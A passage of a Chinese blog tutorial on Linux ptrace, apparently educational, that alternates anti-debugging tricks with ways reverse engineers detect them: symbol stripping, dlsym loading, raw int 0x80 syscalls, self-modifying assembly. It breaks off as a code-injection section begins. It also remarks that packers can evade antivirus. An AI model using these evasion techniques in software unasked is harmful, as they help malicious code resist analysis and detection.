0);&#x2F;&#x2F;PTRACE_SYSCALL,其作用是使内核在子进程进入和退出系统调用时都将其暂停</span><br><span class="line">            &#x2F;&#x2F;得到处于本次调用之后下次调用之前的状态</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3010865210.png"></p>
<p>在这个简单的c程序中，我们跟踪了excel()函数的执行状态，并把打印出相应执行中的一些寄存器的值，返回值等，当然这只是ptrace的部分功能，ptrace能做到的事情还有更多，比如还能修改内存，修改寄存器的值，插入字节码实现下断点的功能。</p>
<h3 id="2-反调试"><a href="#2-反调试" class="headerlink" title="2.反调试"></a>2.反调试</h3><p>我们直接通过攻防来学习ptrace反调试的应用</p>
<p>1.直接使用ptrace函数：</p>
<p><strong>攻防（防）：</strong></p>
<p>进程跟踪器，类似于gdb watch的调试方法， Linux 系统gdb等调试器，都是通过ptrace系统调用实现，ptrace系统调用有一个特性就是当前进程已经被追踪了，就不能被其他父进程追踪，所以只要我们设计的反调试程序开头就先执行一次<code>ptrace(PTRACE_TRACEME, 0, 0, 0)</code>，当gdb再想attach的时候就会发现已经执行了一次不能再执行了从而返回-1，就无法调试了。</p>
<p>看一段简单的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys&#x2F;ptrace.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    if (ptrace(PTRACE_TRACEME, 0, 0, 0) &#x3D;&#x3D;-1 )&#x2F;&#x2F;这里就直接先执行了ptrace(PTRACE_TRACEME, 0, 0, 0)，表示此程序已经被追踪</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;don&#39;t trace me！\n&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;no one trace me！\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序正常的输出结果为：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3101929216.png"></p>
<p>当我们用gdb调试的时候，将无法调试：<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1488349151.png"></p>
<p><strong>反转：（攻）</strong></p>
<p>那么我们如何来识别prtace反调试，检测程序中是否存在ptrace系统调用，如果我们识别到，我们就很容易通过IDA或者Binary Ninja把调用prtace地方修改成NOP，就能绕过这种反调试。</p>
<p>通过工具查看程序是否存在反调试，因为prtace是函数的调用，所以我们可以直接查看符号表来确定。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">readelf -s helloword&#x2F;&#x2F;查看.symtab</span><br><span class="line">readelf -S helloword&#x2F;&#x2F;查看.dynsym</span><br><span class="line">objdump -T hellword&#x2F;&#x2F;查看.dynsym</span><br><span class="line">objdump -t hellword&#x2F;&#x2F;查看.symtab</span><br><span class="line">.......其他的查看符号表工具</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4229789843.png"></p>
<p><strong>反转：（防）</strong></p>
<p>我们可以通过删除符号表的选项，来隐藏对ptrace的调用，但只是针对.sysmtab表，不会去掉<code>.dynsym</code></p>
<p>可以用工具strip,也可以在链接阶段使用使用ld的<code>-s</code>和<code>-S</code>参数，使得连接器生成的输出文件时就不产生符号信息，-s<code>和</code>-S<code>的区别在于</code>-S<code>移除调试符号信息，而</code>-s移除所有符号信息。</p>
<p>同时，我们也可以在GCC中通过<code>-Wl,-s</code>和<code>-Wl,-S</code>来移除符号信息。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1054804442.png"></p>
<p>从图可以看到，即使使用strip 移除了符号表项信息，但是仍会保留.dynsym表的表项</p>
<p>.symtab和dynsym：</p>
<table>
<thead>
<tr>
<th>符号表类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>.symtab</td>
<td>包含大量的信息（包括全局符号global symbols）</td>
</tr>
<tr>
<td>.dynsym</td>
<td>只保留.symtab中的全局符号</td>
</tr>
</tbody></table>
<p>在可执行文件中，函数，变量都为符号，而符号表项所对应的就是地址（不牵扯glt，got表），.symtab和.dynsym这两个都是符号表，dynsym是symtab的较小版本，仅包含全局符号，而symtab会保护这个程序所有符号，因此，也可以在symtab中找到在dynsym中所拥有的符号，但是你会有个疑问:可执行文件明明只需要一个symtab就够了，为什么还要dynsym表？</p>
<p>ELF文件包含使用它们的进程在运行时所需的某些部分（例如代码和数据），这些部分被标记为必须的。链接器，调试器和其他此类工具需要其他许多部分，但正在运行的程序不需要这些部分。所以链接器生成ELF文件时，它将所有程序运行所必需的节收集到文件的一部分中，而所有程序运行不必需的节都放在其他位置。当操作系统加载ELF文件时，只有必需的部分被映射到内存中，不需要的部分保留在文件中，不需要的部分不会映射到内存，在内存中不可见。完整的符号表包含链接或调试文件所需的大量数据，而运行时则不需要。实际上，在可共享库和动态链接出现之前的日子里，在运行时不需要它们，所以为了节省运行内存，定义了第二个张表，为“ dynsym”。</p>
<p>因此，ELF文件有两个符号表，symtab包含所有内容，但是它不是程序运行必需的，可以剥离，并且没有运行的副作用，dynsym是不可剥离的，包含支持运行时操作所需的符号。</p>
<p>如果没有作任何处理，ptrace在.dynsym表中，运行时调用时需要进行重定位，所以我们无法删除dynsym表中对应符号表项。但是如果我们在编译时，静态链接库文件，ptrace符号就放在了symtab表中，我们就可以删除掉对应的符号表项了</p>
<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/83116522669.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/108225897.png"></p>
<p>我们再查看的时候，发现.symtab表没有任何信息！那么就真的意味着我们把ptrace隐藏了吗？</p>
<p><strong>反转：（攻）</strong></p>
<p>但是我们如果使用ida打开的话，在IDA FLIRT(库文件快速识别与鉴定技术)帮助下，只要找到对应的链接库的版本，生成.sig文件，依然能发现ptrace系统调用!</p>
<p><strong>反转：（防）</strong></p>
<p>如果我们给应用程序加壳的话，在没有脱壳的情况下，那么IDA FLIRT(库文件快速识别与鉴定技术)也无法分析出来，比如常见的upx之类的加壳程序！最好能加一个猛壳，不仅能反调试，也能过杀毒软件，多香！</p>
<p><strong>反转：（攻）</strong></p>
<p>诸如像upx这样的壳，我们使用PEID之类的工具可以轻松识别，脱壳就行，除非程序本身使用难以解包的自定义加壳程序，这样的猛壳！比较难脱。</p>
<p><strong>反转：（防）</strong></p>
<p>由于静态加载过于笨重了（可执行文件很大），不是长久之计，如果我们使用动态加载这项技术，就可以回到动态加载库文件（文件很小），并且ptrace将不会出现在.symtab和.dynsym表中。</p>
<p>动态加载是指在运行时加载库并检索库函数地址，我们需要dlopen加载库，dlsym解析函数地址，代码如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;sys&#x2F;ptrace.h&gt;</span><br><span class="line">#include&lt;dlfcn.h&gt;&#x2F;&#x2F;Linux动态库的显式调用</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">    void *handle;&#x2F;&#x2F;定义句柄指针变量</span><br><span class="line">    long (*go)(enum __ptrace_request request, pid_t pid);&#x2F;&#x2F;定义函数指针变量</span><br><span class="line">    &#x2F;&#x2F;获取包含&#39;ptrace&#39;的库的句柄</span><br><span class="line">    handle &#x3D; dlopen (&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;, RTLD_LAZY);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;对动态解析函数“ptrace”的引用,go变量存的是ptrace的地址</span><br><span class="line">    go &#x3D; dlsym(handle, &quot;ptrace&quot;);</span><br><span class="line">    if (go(PTRACE_TRACEME, 0) &lt; 0) &#123;</span><br><span class="line">        puts(&quot;being traced&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;not being traced&quot;);</span><br><span class="line">    &#x2F;&#x2F;关闭句柄</span><br><span class="line">    dlclose(handle);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gcc编译时记得加上选项-ldl，不然会报错！实际效果如下</p>
<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/846479426.png"></p>
<p>我们会发现，我们实实在在的把ptrace隐藏，而不是直接使用strip删除相应的符号表项。</p>
<p><strong>反转：（攻）</strong></p>
<p>但是我们使用ida打开依然会发现存在字符ptrace，或者直接跳到_rodata去找，因为ptrace是字符串常量，就放在__rodate(只读数据段)</p>
<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/1005118859.png"></p>
<p>或者直接使用strings字符搜索</p>
<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/903051067.png"></p>
<p><strong>反转：（防）</strong></p>
<p>因为我们上一个使用了字符串，字符串是一个常量，常量不可以改变修改，且无法隐藏，那如果我们把ptrace定义为字符数组勒？把ptrace拆分成几个字符串</p>
<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;sys&#x2F;ptrace.h&gt;</span><br><span class="line">#include&lt;dlfcn.h&gt;&#x2F;&#x2F;Linux动态库的显式调用</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">    void *handle;&#x2F;&#x2F;定义句柄指针变量</span><br><span class="line">    long (*go)(enum __ptrace_request request, pid_t pid);&#x2F;&#x2F;定义函数指针变量</span><br><span class="line">    char nice[] &#x3D; &quot;ptrace&quot;;&#x2F;&#x2F;定义字符串数组</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;获取包含&#39;ptrace&#39;的库的句柄</span><br><span class="line">    handle &#x3D; dlopen (&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;, RTLD_LAZY);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;对动态解析函数“ptrace”的引用,go变量存的是ptrace的地址</span><br><span class="line">    go &#x3D; dlsym(handle, nice);</span><br><span class="line">    if (go(PTRACE_TRACEME, 0) &lt; 0) &#123;&#x2F;&#x2F;go(PTRACE_TRACEME, 0)相当于ptrace(PTRACE_TRACEME, 0)</span><br><span class="line">        puts(&quot;being traced&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;not being traced&quot;);</span><br><span class="line">    &#x2F;&#x2F;关闭句柄</span><br><span class="line">    dlclose(handle);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们使用strings字符搜索将无效</p>
<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2742249332.png"></p>
<p>使用IDA打开，也好像没有明显ptrace字符的特征：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3385230273.png"></p>
<p><strong>反转：（攻）</strong></p>
<p>如果我们用ida中的功能，把汇编代码转换成c语言伪代码昵？</p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3240894457.png"></p>
<p>况且，就算ptrace调用隐藏的再好，可执行程序也会导入相应的库文件加载ptrace()，也会泄露出蛛丝马迹！</p>
<p><strong>反转：（防）</strong></p>
<p>前面就说过，ptrace其实是一种系统调用，所以我们可以直接通过系统调用号，以及传入的相应的参数，就能越过库的封装，调用ptrace。</p>
<p>在x86的语法中，’int 0x80’是对32位Linux可执行文件进行系统调用的一种方法。系统调用号码放在EAX寄存器中，而前6个参数分别放在EBX，ECX，EDX，ESI，EDI和EBP中。通过查看系统调用表找到ptrace的系统调用号</p>
<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3558141121.png"></p>
<p>编写纯的汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .data</span><br><span class="line">    traced: db &quot;being traced&quot;, 0xA</span><br><span class="line">    tracedLen equ $-traced</span><br><span class="line">    normal: db &quot;not being traced&quot;, 0xA</span><br><span class="line">    normalLen equ $-normal</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    ;calling ptrace</span><br><span class="line">    mov ebx, 0x0</span><br><span class="line">    mov ecx, 0x0</span><br><span class="line">    mov edx, 0x0</span><br><span class="line">    mov eax, 0x1a</span><br><span class="line">    int 0x80 ; sys_ptrace</span><br><span class="line">    cmp eax, 0xFFFFFFFF;把返回值与-1做比较</span><br><span class="line">    jz debugger;eax值伪-1就跳转</span><br><span class="line"></span><br><span class="line">    mov edx, normalLen;正常输出</span><br><span class="line">    mov ecx, normal;&quot;not being traced&quot;</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mov bl, 0x1</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x4</span><br><span class="line">    int 0x80 ; sys_write</span><br><span class="line">    jmp exit</span><br><span class="line"></span><br><span class="line">debugger:</span><br><span class="line">    mov edx, tracedLen;被调试的时候输出</span><br><span class="line">    mov ecx, traced ;&quot;being traced&quot;</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mov bl, 0x1</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x4</span><br><span class="line">    int 0x80 ; sys_write</span><br><span class="line"></span><br><span class="line">exit:</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x1</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    int 0x80 ; sys_exit</span><br></pre></td></tr></table></figure>

<p>或者直接内联汇编到c代码中（正常编译就可以使用）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">static __always_inline volatile long no_hacker()&#123;</span><br><span class="line">    int status &#x3D;0; &#x2F;&#x2F;定义返回值变量</span><br><span class="line">        &#x2F;&#x2F;内联汇编代码，系统调用ptrace，把eax寄存器的值赋给status变量</span><br><span class="line">         __asm__ volatile(&quot;mov $0x0,%%ebx\n\t&quot;</span><br><span class="line">                  &quot;mov $0x0,%%ecx\n\t&quot;</span><br><span class="line">                  &quot;mov $0x0,%%edx\n\t&quot;</span><br><span class="line">                  &quot;mov $0x1a,%%eax\n\t&quot;</span><br><span class="line">                  &quot;int $0x80\n\t&quot;</span><br><span class="line">            :&quot;&#x3D;a&quot;(status)</span><br><span class="line">            :);</span><br><span class="line">     return status;&#x2F;&#x2F;这里把系统的调用的返回值作为no_hacke函数的返回值</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;    </span><br><span class="line">    if (no_hacker()&#x3D;&#x3D;-1)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;don&#39;t trace me！\n&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;no one trace me！\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>纯汇编代码编译运行：</p>
<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2783546991.png"></p>
<p>尝试gdb调试</p>
<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/356951660.png"></p>
<p>可以用readelf工具查看符号表</p>
<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/1033413410.png"></p>
<p>可以看到我们彻底脱离了库的范畴，将不会有库的调用特征！</p>
<p><strong>反转:（攻）</strong></p>
<p>但是牛逼的ida依然能给你标注出来？就问你难受不？</p>
<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/4226237960.png"></p>
<p>其实这里稍微人为分析一下，也可以的，直接查看EAX寄存器的内容，对照系统调用号表，不难看出这是在系统调用ptrace，也有自动化工具，比如有大佬在Binary Ninja制作了一个插件，这个插件就是专门来查看二进制文件进行了那些系统调用的。<br>github地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;yellowbyte.github.io&#x2F;hiding-call-to-ptrace.html</span><br></pre></td></tr></table></figure>

<p><strong>反转：(防）</strong></p>
<p>引用“Self-Modifying Code“技术，顾名思义，就是二进制的可执行代码可以在运行时改变自己（代码，数据…….）。意思是说，我们可以让二进制代码在运行时写入系统调用指令，然后再执行它,这样我们就可以隐藏int 0x80的系统调用指令，因为在运行之前，根本就没有此指令,只有执行到特定的指令时，才会显现，起到很好的隐藏效果。</p>
<p>而在ELF文件标志格式中，程序中的代码和数据都是保存在.text  section中的，为了程序的稳定性和安全性，.text在默认编译的时候是可读可执行，但不可以写，所以必须在使用ld工具进行链接的时候得加上-N选项。</p>
<p>纯汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .data</span><br><span class="line">    traced: db &quot;being traced&quot;, 0xA</span><br><span class="line">    tracedLen equ $-traced</span><br><span class="line">    normal: db &quot;not being traced&quot;, 0xA</span><br><span class="line">    normalLen equ $-normal</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    ;显示ptrace </span><br><span class="line">    mov edi, systemcall;</span><br><span class="line">    mov ax, 0x80cd;“0x80cd”是与系统调用指令“ int 0x80”相对应的操作码</span><br><span class="line">    stosw;将AX寄存器的内容存储到EDI寄存器指向的内存中</span><br><span class="line">    ;calling ptrace</span><br><span class="line">    mov ebx, 0x0</span><br><span class="line">    mov ecx, 0x0</span><br><span class="line">    mov edx, 0x0</span><br><span class="line">    mov eax, 0x1a</span><br><span class="line">systemcall:</span><br><span class="line">    xor eax, ebx;这条指令将被int 0x80覆盖</span><br><span class="line">    cmp eax, 0</span><br><span class="line">    jl debugger</span><br><span class="line">    </span><br><span class="line">    mov edx, normalLen;正常输出</span><br><span class="line">    mov ecx, normal;&quot;not being traced&quot;</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mov bl, 0x1</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x4</span><br><span class="line">    int 0x80 ; sys_write</span><br><span class="line">    jmp exit</span><br><span class="line">debugger:</span><br><span class="line">    mov edx, tracedLen;被调试的时候输出</span><br><span class="line">    mov ecx, traced ;&quot;being traced&quot;</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mov bl, 0x1</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x4</span><br><span class="line">    int 0x80 ; sys_write</span><br><span class="line">exit:</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x1</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    int 0x80 ; sys_exit</span><br></pre></td></tr></table></figure>

<p>编译运行：</p>
<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/8088311688.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2264018565499.png"></p>
<p>直接用ida打开：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/237384718466.png"></p>
<p>很明显，静态分析工具ida也没有识别出来系统调用！<br>通过readelf查看.text段的权限：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/292593659766.png"></p>
<p>然后我们用python中的lief库进行重写，把.text section权限重写回来为AX</p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/365630462666.png"></p>
<p>我们查看新保存的文件new_hacker .text section的权限：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3333688238.png"></p>
<p>一次很nice的换装就搞定了，当然我这里只是通过纯汇编代码验证可行性，在实际的利用场景众，内联汇编插入代码，可能会有更多的混淆指令什么的，让逆向过程更为艰难！</p>
<p><strong>反转：（攻）</strong></p>
<p>虽然静态分析工具ida已经无法分析出系统调用了，但是这依然挡不住strace动态分析，一些有经验的逆向分析人员一看到0x80cd这样的机器码，可能比工具分析都还要快！</p>
<p>而且发现ptrace并不是只能专注与它本身，就是我一定要找出什么ptrace什么字符串啊，什么的，我们完全可以通过一些共同的特点来，比如ptrace在反调试中，如果遇到调试，就会返回-1，程序退出，我们完全可以跟进exit系统的调用。</p>
<h3 id="3-代码注入"><a href="#3-代码注入" class="headerlink" title="3.代码注入"></a>3.代码注入</h3><p>ptrace是Unix系列系统的系统调用之一，其主要功能是实现对进程的追踪，对目标进程，进行流程控制，用户寄存器值读取和写入操作，内存进行读取和修改。这样的特性，就非常适合，用于编写实现，远程代码注入到进程。</p>
<p>而大多数病毒也是利用到这个特性，实现自用空间注入，rip位置直接注入，text段与data段之间的空隙注入，而且gdb实现单步调试的原理也是在每条指令后面插入一个int3。</p>
<p>需要知道request几个参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PTRACE_POKETEXT, PTRACE_POKEDATA</span><br><span class="line">往内存地址中写入一个字节。内存地址由addr给出。</span><br><span class="line"></span><br><span class="line">PTRACE_PEEKTEXT, PTRACE_PEEKDATA</span><br><span class="line">从内存地址中读取一个字节，内存地址由addr给出</span><br><span class="line"></span><br><span class="line">PTRACE_ATTACH</span><br><span class="line">跟踪指定pid 进程</span><br><span class="line"></span><br><span class="line">PTRACE_GETREGS</span><br><span class="line">读取所有寄存器的值</span><br><span class="line"></span><br><span class="line">PTRACE_CONT</span><br><span class="line"></span><br><span class="line">继续执行示被跟踪的子进程，signal为0则忽略引起调试进程中止的信号，若不为0则继续处理信号signal。</span><br><span class="line"></span><br><span class="line">PTRACE_SETREGS</span><br><span class="line">设置寄存器</span><br><span class="line"></span><br><span class="line">PTRACE_DETACH</span><br><span class="line">结束跟踪</span><br></pre></td></tr></table></figure>

<p>用ptrace来实现gdb调试原理：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys&#x2F;ptrace.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;wait.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;user.h&gt;</span><br><span class="line">#include &lt;asm&#x2F;ptrace-abi.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include 